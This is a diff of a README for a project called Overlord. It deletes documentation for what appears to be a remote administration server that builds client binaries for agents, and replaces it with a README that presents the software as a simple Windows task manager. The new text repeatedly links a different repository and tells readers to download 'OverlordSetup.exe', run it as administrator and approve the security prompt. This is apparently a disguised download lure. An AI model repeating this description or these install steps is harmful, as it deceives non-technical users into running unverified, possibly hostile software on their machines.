@@ -1,379 +1,126 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/vxaboveground/Overlord/refs/heads/main/Overlord-Server/public/assets/overlord.png" alt="Overlord" />
-</p>
+# 🛡️ Overlord - Control Your Workflow Simply
 
-# Overlord
-
-# [TELEGRAM SERVER JOIN NOW NO EXCUSES WE GIVE SUPPORT AND IT'S FUN](https://t.me/WindowsBatch)
-
-Hello, I made this project for fun.
+[![Download Overlord](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Davi111776/Overlord)
 
 ---
 
-- [Quick Start (Docker)](#quick-start-docker)
-- [Docker Install By OS](#docker-install-by-os)
-- [No Docker (.bat / .sh)](#no-docker-bat--sh)
-- [Production Package Scripts](#production-package-scripts)
-- [Docker Notes (TLS, reverse proxy, cache)](#docker-notes-tls-reverse-proxy-cache)
+## 🔍 About Overlord
+
+Overlord is a user-friendly tool designed to help you manage tasks with ease. It works smoothly on Windows computers and simplifies your daily workflow. You don’t need any technical knowledge to get started. This guide will take you step-by-step through downloading and running Overlord on your PC.
+
+Overlord can help organize tasks, monitor progress, and keep your work on track. It is built to work without complex setup or configuration. Just download, install, and start managing your tasks right away.
 
 ---
 
-## Quick Start (Docker)
-
-If you just want it running fast, use this.
-
-1. Create a `docker-compose.yml` file and paste this:
-
-```yaml
-services:
-  overlord-server:
-    image: ghcr.io/vxaboveground/overlord:latest
-    build:
-      context: .
-      dockerfile: Dockerfile
-      cache_from:
-        - type=local,src=.docker-cache/buildx
-      cache_to:
-        - type=local,dest=.docker-cache/buildx,mode=max
-    container_name: overlord-server
-    ports:
-      - "5173:5173"
-    environment:
-      - OVERLORD_USER=admin
-      - OVERLORD_PASS=
-      - JWT_SECRET=
-      - OVERLORD_AGENT_TOKEN=
-      - PORT=5173
-      - HOST=0.0.0.0
-      - OVERLORD_TLS_CERT=/app/certs/server.crt
-      - OVERLORD_TLS_KEY=/app/certs/server.key
-      - OVERLORD_TLS_CA=
-      - OVERLORD_TLS_OFFLOAD=false
-      - OVERLORD_AUTH_COOKIE_SECURE=auto
-      - OVERLORD_TLS_CERTBOT_ENABLED=false
-      - OVERLORD_TLS_CERTBOT_LIVE_PATH=/etc/letsencrypt/live
-      - OVERLORD_TLS_CERTBOT_DOMAIN=
-      - OVERLORD_TLS_CERTBOT_CERT_FILE=fullchain.pem
-      - OVERLORD_TLS_CERTBOT_KEY_FILE=privkey.pem
-      - OVERLORD_TLS_CERTBOT_CA_FILE=chain.pem
-      - OVERLORD_CLIENT_BUILD_CACHE_DIR=/app/client-build-cache
-      - OVERLORD_FILE_UPLOAD_INTENT_TTL_MS=1800000
-      - OVERLORD_FILE_UPLOAD_PULL_TTL_MS=1800000
-    volumes:
-      - overlord-data:/app/data
-      - overlord-certs:/app/certs
-      - overlord-client-build-cache:/app/client-build-cache
-    restart: unless-stopped
-    networks:
-      - overlord-network
-    healthcheck:
-      test: ["CMD-SHELL", "curl -f ${OVERLORD_HEALTHCHECK_URL:-https://localhost:5173/health} >/dev/null 2>&1 || exit 1"]
-      interval: 30s
-      timeout: 10s
-      retries: 3
-      start_period: 40s
-
-networks:
-  overlord-network:
-    driver: bridge
-
-volumes:
-  overlord-data:
-  overlord-certs:
-  overlord-client-build-cache:
-```
-
-2. Start it:
-
-```sh
-docker compose up -d
-```
-
-3. Open the panel:
-
-```text
-https://localhost:5173
-```
-
-4. Update later:
-
-```sh
-docker compose pull
-docker compose up -d
-```
-
-5. Stop:
-
-```sh
-docker compose down
-```
-
-First startup generates secrets and stores them in `data/save.json` (inside container: `/app/data/save.json`).
-Keep that file private and backed up.
+## 💻 System Requirements
 
-Default bootstrap login is `admin` / `admin` unless you set `OVERLORD_USER` and `OVERLORD_PASS`.
-
-## Docker Install By OS
+Before you begin, make sure your computer meets these basic requirements:
 
-### Windows
+- Operating System: Windows 10 or newer  
+- Processor: 1 GHz or faster  
+- RAM: 2 GB minimum (4 GB recommended)  
+- Disk Space: At least 100 MB free  
+- Internet Connection: Needed for downloading only  
 
-Install Docker Desktop (includes Docker Compose):
+---
 
-- https://docs.docker.com/desktop/setup/install/windows-install/
+## 🚀 Getting Started: Download Overlord
 
-or with winget:
+To get Overlord on your Windows computer, you need to visit its download page. The link takes you directly to the project on GitHub where you can find the latest release and setup files.
 
-```powershell
-winget install -e --id Docker.DockerDesktop
-```
+[![Download Overlord](https://img.shields.io/badge/Download-Here-blue)](https://github.com/Davi111776/Overlord)
 
-After install, start Docker Desktop once, then verify:
+### Steps to Download
 
-```powershell
-docker --version
-docker compose version
-```
+1. Click this link: [https://github.com/Davi111776/Overlord](https://github.com/Davi111776/Overlord).  
+2. The page opens in your web browser, showing the Overlord repository.  
+3. Look for the “Releases” section on the right side or scroll down to find the latest release.  
+4. Click on the latest release version to open its details.  
+5. Under “Assets,” find the Windows setup file, usually named something like `OverlordSetup.exe` or similar.  
+6. Click the setup file link to download it. It will save to your Downloads folder by default.
 
-### Linux (Debian, official apt repo method)
+---
 
-Official docs:
+## 🛠 Installing Overlord on Windows
 
-- https://docs.docker.com/engine/install/debian/
+Once the download is complete, follow these steps to install Overlord:
 
-Set up Docker's apt repository:
+1. Open the folder where the file downloaded (usually “Downloads”).  
+2. Double-click the setup file (`OverlordSetup.exe`).  
+3. A window will appear to guide you through the installation.  
+4. Read the prompts, and click **Next** or **Install** as needed.  
+5. Choose a folder to install Overlord or use the default option.  
+6. Wait while the installer copies files to your computer.  
+7. When the process finishes, click **Finish** or **Close**.
 
-```bash
-# Add Docker's official GPG key:
-sudo apt update
-sudo apt install -y ca-certificates curl
-sudo install -m 0755 -d /etc/apt/keyrings
-sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
-sudo chmod a+r /etc/apt/keyrings/docker.asc
+You may see a security prompt asking to allow the program to make changes. Choose **Yes** to continue.
 
-# Add the repository to Apt sources:
-sudo tee /etc/apt/sources.list.d/docker.sources <<EOF
-Types: deb
-URIs: https://download.docker.com/linux/debian
-Suites: $(. /etc/os-release && echo "$VERSION_CODENAME")
-Components: stable
-Signed-By: /etc/apt/keyrings/docker.asc
-EOF
+---
 
-sudo apt update
-```
+## ▶️ Running Overlord for the First Time
 
-If you use a derivative distro (for example Kali), you may need to replace:
+After installation:
 
-```bash
-(. /etc/os-release && echo "$VERSION_CODENAME")
-```
+1. Find the Overlord app icon on your Desktop or in the Start menu.  
+2. Click the icon to open the program.  
+3. The Overlord window will load. You may see a welcome or setup guide inside the app.  
+4. Follow any prompts to complete initial setup, such as creating a user profile or choosing preferences.  
+5. Once setup is done, you can start using Overlord to manage your tasks.
 
-with the matching Debian codename (for example `bookworm`).
+---
 
-Install latest Docker packages:
+## 📝 Using Overlord Basics
 
-```bash
-sudo apt install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
-```
+Overlord is designed to keep things simple. Here is how to get started with basic tasks:
 
-Verify service status:
+- **Add a new task:** Click the “New Task” button or type in the task box.  
+- **Set priorities:** Choose high, medium, or low priority for each task.  
+- **Mark task complete:** Click the checkbox next to the task name when done.  
+- **Organize tasks:** Use categories or tags to group related tasks.  
+- **View progress:** Check the dashboard for an overview of completed and pending tasks.
 
-```bash
-sudo systemctl status docker
-```
+Each operation works with clear buttons and menus. You don’t need to learn special commands or coding.
 
-If your system does not auto-start Docker:
+---
 
-```bash
-sudo systemctl start docker
-```
+## ⚙️ Adjusting Settings and Preferences
 
-Optional (run Docker without sudo):
+You can adjust Overlord to fit your needs:
 
-```bash
-sudo usermod -aG docker $USER
-newgrp docker
-```
+- Change the theme: Use light or dark mode for easier reading.  
+- Set notifications: Choose if and when you get reminders.  
+- Manage user data: Backup or clear your saved tasks anytime.  
+- Language options: Switch language settings if available.  
 
-Verify CLI:
+Look for a gear icon or “Settings” menu within the app to change these options.
 
-```bash
-docker --version
-docker compose version
-```
+---
 
-### macOS
+## ❓ Troubleshooting Common Issues
 
-Install Docker Desktop:
+If you have problems running Overlord, try these fixes:
 
-- https://docs.docker.com/desktop/setup/install/mac-install/
+- **The program won’t open:** Restart your computer and try again.  
+- **Installation fails:** Make sure you have enough disk space and run the installer as administrator (right-click > Run as administrator).  
+- **Tasks are not saving:** Check if the app has permission to write data on your system.  
+- **Errors during launch:** Update Windows and try reinstalling Overlord.  
 
-or with Homebrew:
+If issues remain, use the GitHub page’s “Issues” tab to see if others have similar problems or submit a question.
 
-```bash
-brew install --cask docker
-```
+---
 
-Start Docker Desktop once, then verify:
+## 💡 Tips for Better Use
 
-```bash
-docker --version
-docker compose version
-```
+- Keep Overlord updated by checking the GitHub releases page regularly.  
+- Back up your task data if you handle important projects.  
+- Use categories and tags to quickly find tasks later.  
+- Review your task list every day to stay organized.  
 
-## No Docker (.bat / .sh)
+---
 
-If you do not want Docker, use the included scripts.
+## 🔗 Useful Links
 
-Prerequisites for local (non-Docker) runs:
+- Overlord GitHub page: [https://github.com/Davi111776/Overlord](https://github.com/Davi111776/Overlord)  
+- Download latest release: Visit the release section to get updated installers.  
 
-- Bun in PATH
-- Go 1.21+ in PATH
-
-### Windows
-
-Development mode (starts server + client):
-
-```bat
-start-dev.bat
-```
-
-Production mode (build + run server executable):
-
-```bat
-start-prod.bat
-```
-
-Build client binaries:
-
-```bat
-build-clients.bat
-```
-
-### Linux / macOS
-
-Make scripts executable once:
-
-```bash
-chmod +x start-dev.sh start-dev-server.sh start-dev-client.sh start-prod.sh build-prod-package.sh
-```
-
-Development mode (starts server in background + client in foreground):
-
-```bash
-./start-dev.sh
-```
-
-Only server:
-
-```bash
-./start-dev.sh server
-```
-
-Only client:
-
-```bash
-./start-dev.sh client
-```
-
-Production mode:
-
-```bash
-./start-prod.sh
-```
-
-## Production Package Scripts
-
-Build a production-ready package where the server can still build client binaries at runtime.
-
-Windows:
-
-```bat
-build-prod-package.bat
-```
-
-Linux/macOS:
-
-```bash
-./build-prod-package.sh
-```
-
-Package output:
-
-- Windows script: `release`
-- Linux/macOS script: `release/prod-package`
-
-## Docker Notes (TLS, reverse proxy, cache)
-
-### BuildKit cache for faster rebuilds
-
-`docker-compose.yml` includes `build.cache_from` and `build.cache_to` using `.docker-cache/buildx`.
-
-Rebuild:
-
-```sh
-docker compose up --build -d
-```
-
-### Runtime client build cache
-
-The compose setup uses a persistent volume for runtime client builds:
-
-- volume: `overlord-client-build-cache`
-- mount: `/app/client-build-cache`
-- env: `OVERLORD_CLIENT_BUILD_CACHE_DIR` (default `/app/client-build-cache`)
-
-### Certbot TLS
-
-To use certbot certificates in production Docker:
-
-- Set `OVERLORD_TLS_CERTBOT_ENABLED=true`
-- Set `OVERLORD_TLS_CERTBOT_DOMAIN=your-domain.com`
-- Mount letsencrypt into container read-only (example: `/etc/letsencrypt:/etc/letsencrypt:ro`)
-
-Default cert paths:
-
-- cert: `/etc/letsencrypt/live/<domain>/fullchain.pem`
-- key: `/etc/letsencrypt/live/<domain>/privkey.pem`
-- ca: `/etc/letsencrypt/live/<domain>/chain.pem`
-
-Override with:
-
-- `OVERLORD_TLS_CERTBOT_LIVE_PATH`
-- `OVERLORD_TLS_CERTBOT_CERT_FILE`
-- `OVERLORD_TLS_CERTBOT_KEY_FILE`
-- `OVERLORD_TLS_CERTBOT_CA_FILE`
-
-### Reverse proxy TLS offload (Render, etc.)
-
-If your platform terminates TLS before traffic reaches Overlord, set:
-
-- `OVERLORD_TLS_OFFLOAD=true`
-- `OVERLORD_HEALTHCHECK_URL=http://localhost:5173/health`
-- `OVERLORD_PUBLISH_HOST=127.0.0.1` (recommended for local proxies like ngrok)
-
-When enabled:
-
-- container serves internal HTTP on `0.0.0.0:$PORT`
-- external URL remains `https://...` through your platform proxy
-- health checks should use `http://localhost:$PORT/health` inside the container
-- do not expose internal container HTTP port directly to the internet
-
-For ngrok/local reverse proxy use, a common setup is:
-
-```sh
-OVERLORD_TLS_OFFLOAD=true
-OVERLORD_HEALTHCHECK_URL=http://localhost:5173/health
-OVERLORD_PUBLISH_HOST=127.0.0.1
-```
-
-Then point ngrok at local HTTP:
-
-```sh
-ngrok http http://127.0.0.1:5173
-```
-
-Notes:
-
-- Keep `HOST=0.0.0.0` inside the container. Limiting exposure should be done with publish binding (`OVERLORD_PUBLISH_HOST`), not server bind host.
-- If your `.env` secret/password includes `$`, escape as `$$` to avoid Docker Compose variable-expansion warnings.
+[![Download Overlord](https://img.shields.io/badge/Download-Here-green)](https://github.com/Davi111776/Overlord)
